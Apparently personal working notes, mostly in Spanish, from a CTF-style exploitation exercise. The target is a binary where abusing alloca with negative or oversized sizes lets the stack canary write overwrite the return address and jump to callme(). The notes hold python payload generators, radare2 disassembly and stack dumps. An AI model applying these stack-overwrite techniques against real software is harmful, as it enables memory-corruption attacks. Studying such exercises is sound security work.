0x080485ab -> sym.callme

alloca max -> 0x80000020

alocar max más X bytes, sobreescribir el ret pointer a callme()

rompe:
python -c 'len=8379100;print str(len) + "\n1\n" + "A" * len' > input.txt
no rompe:
python -c 'len=8379099;print str(len) + "\n1\n" + "A" * len' > input.txt



man alloca

BUGS
       There is no error indication if the stack  frame  cannot  be  extended.
       (However, after a failed allocation, the program is likely to receive a
       SIGSEGV signal if it attempts to access the unallocated space.)

       On many systems alloca() cannot be used inside the list of arguments of
       a function call, because the stack space reserved by alloca() would ap‐
       pear on the stack in the middle of the space  for  the  function  argu‐
       ments.

usar ulimit???
ulimit -s unlimited

sub esp, eax -> 0x08048769


si llamo alloca con más de 0x7fffffff
size vale 0x7fffffff, y se alocan 0x7fffffff + 33 bytes (0x80000020)
lo cual no me sirve porque yo necesito que la ver size sea mayor que lo que alloca expande el stack


size = -1000
eax = 0xfffffc30
esp antes del sub: 0xfffc1e80
esp dsp del sub  : 0xfffc2250

el stack decrecio?
mmm..
podre hacer que el stack cookie se escriba en el ret addr y que vaya a callme() ???
sounds like a plan

cookie -> 134514091 -> 0x080485ab


|           0x080487be      83c410         add esp, 0x10               ; esp=0xff894bbc -> 0x8310c483 ; of=0x0 ; sf=0x1 ; zf=0x0 ; cf=0x0 ; pf=0x0|           0x080487c1      a150a00408     mov eax, dword [obj.buffer]    ; [0x804a050:4]=0 ; eax=0x0                                             
|           0x080487c6      8b1548a00408   mov edx, dword [obj.size]    ; [0x804a048:4]=0 ; edx=0x0                                               
|           0x080487cc      01c2           add edx, eax                ; edx=0x0 ; of=0x0 ; sf=0x0 ; zf=0x1 ; cf=0x0 ; pf=0x1                     
|           0x080487ce      a14ca00408     mov eax, dword [obj.g_canary]    ; [0x804a04c:4]=0 ; eax=0x0                                         
|           0x080487d3      8902           mov dword [edx], eax                                                                                   
|           0x080487d5      8b0d40a00408   mov ecx, dword obj.stdin    ; obj.stdin__GLIBC_2.0 ; [0x804a040:4]=0x2aa2b5c0 ; ecx=0x2aa2b5c0     
|           0x080487db      8b1548a00408   mov edx, dword [obj.size]    ; [0x804a048:4]=0 ; edx=0x0                                               
|           0x080487e1      a150a00408     mov eax, dword [obj.buffer]    ; [0x804a050:4]=0 ; eax=0x0 

en 0x080487ce se calcula donde se escribe el stack cookie


[0x08048663]> pxw @ esp
0xffef7420  0x2a997440 0xffef7440 0x00000000 0x2a78eb41  @t.*@t......A.x*


|           0x08048834      c9             leave                       ; esp=0xffef7428 ebp ; ebp=0x0
|           0x08048835      8d61fc         lea esp, [ecx - 4]          ; esp=0xffef743c -> 0x8310c483
\           0x08048838      c3             ret 


[0x08048838]> pxw 4 @ esp
0xffef743c  0x2a78eb41                                   A.x*



size : -50 -> -16
size : -60 -> -32
size : -70 -> -48
size : -90 -> -64

